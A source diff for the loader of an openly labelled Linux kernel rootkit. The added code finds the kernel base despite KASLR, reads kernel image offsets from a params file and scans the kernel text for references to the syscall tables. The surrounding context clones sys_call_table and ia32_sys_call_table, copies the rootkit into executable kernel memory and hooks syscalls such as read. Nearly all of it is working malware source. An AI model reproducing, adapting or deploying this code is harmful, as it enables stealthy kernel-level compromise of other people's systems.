@@ -64,6 +64,7 @@
  * 28/01/2018 - D1W0U
  */
 
+#include <linux/binfmts.h>
 #include <linux/skbuff.h>
 #include <linux/vmalloc.h>
 #include <asm/desc.h>
@@ -95,13 +96,13 @@
 #define CPA_ARRAY 2
 #ifdef CONFIG_X86_64
 /* Using 64-bit values saves one instruction clearing the high half of low */
-#define DECLARE_ARGS(val, low, high)    unsigned long low, high
-#define EAX_EDX_VAL(val, low, high) ((low) | (high) << 32)
-#define EAX_EDX_RET(val, low, high) "=a" (low), "=d" (high)
+#define MY_DECLARE_ARGS(val, low, high)    unsigned long low, high
+#define MY_EAX_EDX_VAL(val, low, high) ((low) | (high) << 32)
+#define MY_EAX_EDX_RET(val, low, high) "=a" (low), "=d" (high)
 #else
-#define DECLARE_ARGS(val, low, high)    unsigned long long val
-#define EAX_EDX_VAL(val, low, high) (val)
-#define EAX_EDX_RET(val, low, high) "=A" (val)
+#define MY_DECLARE_ARGS(val, low, high)    unsigned long long val
+#define MY_EAX_EDX_VAL(val, low, high) (val)
+#define MY_EAX_EDX_RET(val, low, high) "=A" (val)
 #endif
 //#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
 //#define sleep(var)
@@ -114,6 +115,11 @@
  */
 #include "kernel.h"
 #include "hooks.h"
+
+/*
+ * Module params.
+ */
+long image_sct = 0, image_ia32sct = 0, image_text = 0, text_size = 0;
 
 /*
  * Loader declarations.
@@ -154,6 +160,9 @@ void rseed(long);
 long rand64(void);
 inline int rand32(void);
 mm_segment_t *search_addr_limit(void);
+long find_kernel_base(long start);
+int load_params(void);
+long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen);
 
 /*
  * Global variables.
@@ -174,8 +183,7 @@ void enable_wp(void);
 
 int load(void) {
 	size_t my_sct_len = 0, my_sct_pagelen = 0;
-	void *tmp = NULL;
-	long addr = 0;
+	long addr = 0, kernel_base = 0;
 	int ret = 0;
 
 	addr_limit = search_addr_limit();
@@ -221,7 +229,7 @@ int load(void) {
 	}
 
 	printk("kernel_tree = %d\n", kernel_tree);
-	printk("get_fs = %Lx\n", my_get_fs().seg);
+	printk("get_fs = %lx\n", my_get_fs().seg);
 	//return -1;
 
 	/*
@@ -232,12 +240,45 @@ int load(void) {
 	f_sys_write = kallsyms_lookup_name("sys_write");
 
 	/*
+	 * Load parameters, from "arprk.params".
+	 */
+	if (load_params()) {
+		return -2;
+	}
+
+	/*
+	 * Find kernel base.
+	 * Take offset to sys_call_table, and ia32_sys_call_table (from vmlinuz image offset in param).
+	 * Search all references in .text section. (size in param from vmlinuz image).
+	 */
+	kernel_base = find_kernel_base(0xffffffff81000000); // TODO: replace value by parameter
+	sys_call_table = (void *)(kernel_base - image_text + image_sct);
+	ia32_sys_call_table = (void *)(kernel_base - image_text + image_ia32sct);
+
+	printk("kernel_base         = %lx\n", kernel_base);
+	printk("image .text         = %lx\n", image_text);
+	printk("image sct           = %lx\n", image_sct);
+	printk("image ia32sct       = %lx\n", image_ia32sct);
+	printk(".text size          = %ld\n", text_size);
+	printk("sys_call_table      = %lx\n", sys_call_table);
+	printk("ia32_sys_call_table = %lx\n", ia32_sys_call_table);
+
+	sct_refs = find_int_bytecode_refs(kernel_base, text_size, (int)sys_call_table, &nsct_refs);
+	pinfo("Found %d refs to sys_call_table.\n", nsct_refs);
+	ia32sct_refs = find_int_bytecode_refs(kernel_base, text_size, (int)ia32_sys_call_table, &nia32sct_refs);
+	pinfo("Found %d refs to ia32_sys_call_table.\n", nia32sct_refs);
+
+	return -1;
+
+	/*
 	 * Search sys_call_table[] address.
 	 */
+	/*
 	tmp = search_sct_fastpath(&psct_fastpath);
 	if (tmp == NULL) {
 		return -2;
 	}
+	printk("fastpath = %lx\n", tmp);
 	if (search_sct_slowpath(&psct_slowpath) != tmp) {
 		return -2;
 	}
@@ -247,8 +288,8 @@ int load(void) {
 		perr("Sorry, can't find sys_call_table in int 0x80.\n");
 		return -2;
 	}
-
-	pinfo("Hurra! sys_call_table = %Lx, fastpath_location = %Lx, slowpath_location = %Lx, ia32_sys_call_table = %Lx, pia32sct = %Lx\n", sys_call_table, psct_fastpath, psct_slowpath,
+	*/
+	pinfo("Hurra! sys_call_table = %lx, fastpath_location = %lx, slowpath_location = %lx, ia32_sys_call_table = %lx, pia32sct = %lx\n", sys_call_table, psct_fastpath, psct_slowpath,
 			ia32_sys_call_table, pia32sct);
 
 	/*
@@ -257,7 +298,7 @@ int load(void) {
 	/*
 	   f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
 	   if (f_change_page_attr_set_clr != NULL) {
-	   pinfo("Hurra! change_page_attr_set_clr() = %Lx\n", f_change_page_attr_set_clr);
+	   pinfo("Hurra! change_page_attr_set_clr() = %lx\n", f_change_page_attr_set_clr);
 	   } else {
 	   perr("Sorry, can't find change_page_attr_set_clr().\n");
 	   return 0;
@@ -265,7 +306,7 @@ int load(void) {
 	 */
 	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
 	if (f__vmalloc_node_range != NULL) {
-		pinfo("Hurra! __vmalloc_node_range() = %Lx\n", f__vmalloc_node_range);
+		pinfo("Hurra! __vmalloc_node_range() = %lx\n", f__vmalloc_node_range);
 	} else {
 		perr("Sorry, can't find __vmalloc_node_range().\n");
 		return -2;
@@ -284,14 +325,14 @@ int load(void) {
 	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
 	rseed(get_seconds());
 	module_load_offset = (rand32() % 1024 + 1) * PAGE_SIZE;
-	pinfo("module_load_offset = %x, addr would be = %Lx\n", module_load_offset, MODULES_VADDR + module_load_offset);
+	pinfo("module_load_offset = %x, addr would be = %lx\n", module_load_offset, MODULES_VADDR + module_load_offset);
 	my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
 	//my_sct = vmalloc(my_sct_pagelen);
 	if (my_sct == NULL) {
 		perr("Sorry, can't reserve memory with __vmalloc_node_range() for my_sct.\n");
 		return -2;
 	}
-	pinfo("reserved %Lx bytes at %Lx\n", my_sct_pagelen, my_sct);
+	pinfo("reserved %d bytes at %lx\n", my_sct_pagelen, my_sct);
 
 	// zero memory
 	ret = safe_zero(my_sct, my_sct_pagelen);
@@ -308,7 +349,7 @@ int load(void) {
 		perr("Sorry, can't clone sys_call_table.\n");
 		return -2;
 	}
-	pinfo("my_sct = %Lx, len = %d\n", my_sct, my_sct_len);
+	pinfo("my_sct = %lx, len = %d\n", my_sct, my_sct_len);
 
 	//sleep(ret);
 
@@ -332,7 +373,7 @@ int load(void) {
 		perr("Sorry, can't reserve memory for my_ia32sct.\n");
 		return -2;
 	}
-	pinfo("reserved %d bytes at %Lx.\n", my_sct_pagelen, my_ia32sct);
+	pinfo("reserved %d bytes at %lx.\n", my_sct_pagelen, my_ia32sct);
 
 	//sleep(ret);
 
@@ -352,7 +393,7 @@ int load(void) {
 		// TODO: free memory
 		return -2;
 	}
-	pinfo("ia32_sct cloned at = %Lx\n", my_ia32sct);
+	pinfo("ia32_sct cloned at = %lx\n", my_ia32sct);
 
 	//sleep(ret);
 
@@ -378,11 +419,11 @@ int load(void) {
 	/*
 	 * Insert out rootkit into memory.
 	 */
-	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %Lx, kernel_start_pagdown = %Lx\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
+	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %lx, kernel_start_pagdown = %lx\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
 	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
 	kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
 	if (kernel_addr != NULL) {
-		pinfo("kernel_addr = %Lx, kernel_addr_pagdown = %Lx\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
+		pinfo("kernel_addr = %lx, kernel_addr_pagdown = %lx\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
 		/*
 		 * Make our rootkit code executable.
 		 */
@@ -405,7 +446,7 @@ int load(void) {
 		//pinfo("kernel_test execution from LKM successful.\n");
 
 		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
-		//pinfo("f_kernel_test at %Lx\n", f_kernel_test);
+		//pinfo("f_kernel_test at %lx\n", f_kernel_test);
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
 
@@ -431,7 +472,7 @@ void install_hooks(void) {
 	//HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
 	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
 	HOOK64(__NR_read, KADDR(my_read64));
-	//pinfo("my_read64 at %Lx\n", KADDR(my_read64));
+	//pinfo("my_read64 at %lx\n", KADDR(my_read64));
 	pinfo("Hooks installed!\n");
 }
 
@@ -447,7 +488,7 @@ int safe_zero(void *dst, size_t len) {
 	char *cdst = dst;
 
 	for(; i < len; i++) {
-		//pinfo("writing %d byte(s) at %Lx\r", sizeof(zero), &cdst[i]);
+		//pinfo("writing %d byte(s) at %lx\r", sizeof(zero), &cdst[i]);
 		ret = probe_kernel_write(&cdst[i], &zero, sizeof(zero));
 		if (ret != 0) {
 			return ret;
@@ -554,7 +595,7 @@ void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fm
 						if ((dist >= from && dist <= to) || ((dist * -1) >= from && (dist * -1) <= to)) {
 							pos_count ++;
 							if (pos_count == position) {
-								pinfo("%s found! addr = %Lx\n", inst, addr_found);
+								pinfo("%s found! addr = %lx\n", inst, addr_found);
 								*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
 								cs_free(insn, count);
 								cs_close(&handle);
@@ -621,8 +662,8 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
 						//pinfo("->>%s<<--\n", insn[j].op_str);
 						sscanf(insn[j].op_str, fmt, &addr_found);
 						//int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
-						//pinfo("r %d %Lx\n", r, addr_found);
-						pinfo("%s found! addr = %Lx\n", inst, addr_found);
+						//pinfo("r %d %lx\n", r, addr_found);
+						pinfo("%s found! addr = %lx\n", inst, addr_found);
 						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
 						cs_free(insn, count);
 						cs_close(&handle);
@@ -685,8 +726,8 @@ void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, s
 					if (pos_count == position) {
 						sscanf(insn[j].op_str, fmt, &addr_found);
 						//int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
-						//pinfo("r %d %Lx\n", r, addr_found);
-						pinfo("%s found! addr = %Lx\n", opstr, addr_found);
+						//pinfo("r %d %lx\n", r, addr_found);
+						pinfo("%s found! addr = %lx\n", opstr, addr_found);
 						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
 						cs_free(insn, count);
 						cs_close(&handle);
@@ -806,10 +847,10 @@ void *search_ia32sct_int80h(unsigned int **psct_addr) {
 	gate_desc *idt = NULL;
 
 	my_store_idt(&idtr);
-	pinfo("IDT address = %Lx, size = %d\n", idtr.address, idtr.size);
+	pinfo("IDT address = %lx, size = %d\n", idtr.address, idtr.size);
 	idt = (gate_desc *) idtr.address;
 	ia32sct = (void *) (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
-	pinfo("int 0x80 handler address = %Lx\n", ia32sct);
+	pinfo("int 0x80 handler address = %lx\n", ia32sct);
 	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
 	tmp = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x500000, 0xa10000, (void **)psct_addr);
 	if (tmp != NULL) {
@@ -844,7 +885,7 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
 	} else {
-		pinfo("kernel version might be <= 4.11 or >= 4.14 - on (search_sct_fastpath()).\n");
+		pinfo("kernel version might be <= 4.11 or >= 4.14 - search_sct_fastpath().\n");
 	}
 
 	//disassemble(sct, 0x200);
@@ -865,7 +906,7 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 		if (tmp) {
 			sct = tmp;
 			sct = (void *) ((long) sct * -1);
-			pinfo("found movq to stage2: %Lx\n", sct);
+			pinfo("found movq to stage2: %lx\n", sct);
 			//disassemble(sct, 0x200);
 			tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 1, (void **)psct_addr); // search for a direct call with offset
 			if (tmp == NULL) {
@@ -897,10 +938,11 @@ void *search_sct_slowpath(unsigned int **psct_addr) {
 	} else {
 		pinfo("kernel version might be <= 4.11 or >= 4.14 - search_sct_slowpath().\n");
 	}
+
 	tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x500000, 0xa10000, (void **)psct_addr);
 	if (tmp != NULL) {
 		sct = tmp;
-		pinfo("do_syscall_64 maybe at %Lx\n", sct);
+		pinfo("do_syscall_64 maybe at %lx\n", sct);
 		tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 		if (tmp != NULL) {
 			sct = tmp;
@@ -908,7 +950,8 @@ void *search_sct_slowpath(unsigned int **psct_addr) {
 			return sct;
 		} else {
 			sct = (void *) my_rdmsr(MSR_LSTAR);
-			tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 2, (void **)psct_addr); // search for a direct call with offset
+			//disassemble(sct, 0x300);
+			tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x300, 2, (void **)psct_addr); // search for a direct call with offset
 			if (tmp != NULL) {
 				sct = tmp;
 				sct = (void *)((long) sct * -1);
@@ -922,12 +965,12 @@ void *search_sct_slowpath(unsigned int **psct_addr) {
 		if (tmp) {
 			sct = tmp;
 			sct = (void *) ((long) sct * -1);
-			pinfo("found movq to stage2: %Lx\n", sct);
+			pinfo("found movq to stage2: %lx\n", sct);
 			//disassemble(sct, 0x200);
 			tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x500000, 0xa10000, (void **)psct_addr);
 			if (tmp != NULL) {
 				sct = tmp;
-				pinfo("do_syscall_64 maybe at %Lx\n", sct);
+				pinfo("do_syscall_64 maybe at %lx\n", sct);
 				//disassemble(sct, 0x100);
 				tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 				if (tmp != NULL) {
@@ -971,11 +1014,11 @@ inline unsigned long my_gate_offset(const gate_desc *g)
 
 inline unsigned long long notrace my_rdmsr(unsigned int msr)
 {
-	DECLARE_ARGS(val, low, high);
+	MY_DECLARE_ARGS(val, low, high);
 
-	asm("rdmsr" : EAX_EDX_RET(val, low, high) : "c" (msr));
+	asm("rdmsr" : MY_EAX_EDX_RET(val, low, high) : "c" (msr));
 
-	return EAX_EDX_VAL(val, low, high);
+	return MY_EAX_EDX_VAL(val, low, high);
 }
 
 // from https://stackoverflow.com/questions/15038174/generate-random-numbers-without-using-any-external-functions
@@ -1020,14 +1063,113 @@ mm_segment_t *search_addr_limit(void) {
 		if (*(long *)&cti[i] == 0x7ffffffff000) {
 			// We are in kernel < 4.8.x
 			printk("addr_limit offset %ld\n", i);
-			printk("cti               %Lx\n", cti);
+			printk("cti               %lx\n", cti);
 			return (mm_segment_t *)(cti + i);
 		} else if (*(long *)&cts[i] == 0x7ffffffff000) {
 			// We are in kernel >= 4.8.x
 			printk("addr_limit offset %ld\n", i);
-			printk("cts               %Lx\n", cts);
+			printk("cts               %lx\n", cts);
 			return (mm_segment_t *)(cts + i);
 		}
 	}
 	return NULL;
+}
+
+/*
+ * This functions locates the _text address (kernel base), with(out) KASLR.
+ */
+long find_kernel_base(long start) {
+	off_t off = 0, inc = 0x100000;
+	char opcode = 0;
+
+	for (; !opcode; off += inc) {
+		probe_kernel_read(&opcode, (void *)start + off, 1);
+	}
+
+	return start + off - inc;
+}
+
+int load_params(void) {
+	void *tmp = NULL;
+	int ret = 0;
+	mm_segment_t old_fs;
+	loff_t pos = 0;
+
+	tmp = filp_open("arprk.params", O_RDONLY, 0);
+	if (IS_ERR(tmp)) {
+		perr("Sorry, can't open params file.\n");
+		return -2;
+	}
+
+	// We can't use vfs_read because is not exported since v4.14.
+	// kernel_read maybe is possible, but depending on the tree the args are order changed.
+	// So, the best option I found is read_code(). That is not the best option because it flushes icache,
+	// but theorically won't hurt...
+
+	//kernel_read(tmp, (void *)&image_text, sizeof(image_text), &pos);
+	//kernel_read(tmp, (void *)&image_sct, sizeof(image_sct), &pos);
+	//kernel_read(tmp, (void *)&image_ia32sct, sizeof(image_ia32sct), &pos);
+	//kernel_read(tmp, (void *)&text_size, sizeof(text_size), &pos);
+
+	old_fs = my_get_fs();
+	my_set_fs(KERNEL_DS);
+	ret = read_code(tmp, (ulong)&image_text, pos, sizeof(image_text));
+	if (ret != sizeof(image_text)) {
+		perr("Sorry, can't read from params' file.\n");
+		return -2;
+	}
+	pos += ret;
+	ret = read_code(tmp, (ulong)&image_sct, pos, sizeof(image_sct));
+	if (ret != sizeof(image_sct)) {
+		perr("Sorry, can't read from params' file.\n");
+		return -2;
+	}
+	pos += ret;
+	ret = read_code(tmp, (ulong)&image_ia32sct, pos, sizeof(image_ia32sct));
+	if (ret != sizeof(image_ia32sct)) {
+		perr("Sorry, can't read from params' file.\n");
+		return -2;
+	}
+	pos += ret;
+	ret = read_code(tmp, (ulong)&text_size, pos, sizeof(text_size));
+	if (ret != sizeof(text_size)) {
+		perr("Sorry, can't read from params' file.\n");
+		return -2;
+	}
+	my_set_fs(old_fs);
+	filp_close(tmp, NULL);
+
+	if (image_text == 0 || image_sct == 0 || image_ia32sct == 0 || text_size == 0) {
+		perr("Sorry, some of the parameters are 0.\n");
+		return -2;
+	}
+
+	return 0;
+}
+
+long *find_int_bytecode_refs(void *addr, size_t len, int bytecode, size_t *olen) {
+    off_t off = 0;
+    int *p = NULL;
+    long *refs = NULL;
+	size_t refs_size = 2;
+
+	refs = kmalloc(sizeof(long) * refs_size, GFP_KERNEL);
+	if (IS_ERR(refs)) {
+		return NULL;
+	}
+
+	for (*olen = 0; off < text_size; off++) {
+        p = (int *) (addr + off);
+        if (*p == bytecode) {
+			refs[*olen] = (long) p;
+			refs_size += 1;
+			*olen += 1;
+			refs = krealloc(refs, sizeof(long) * refs_size, GFP_KERNEL);
+			if (IS_ERR(refs)) {
+				return NULL;
+			}
+        }
+    }
+
+	return refs;
 }
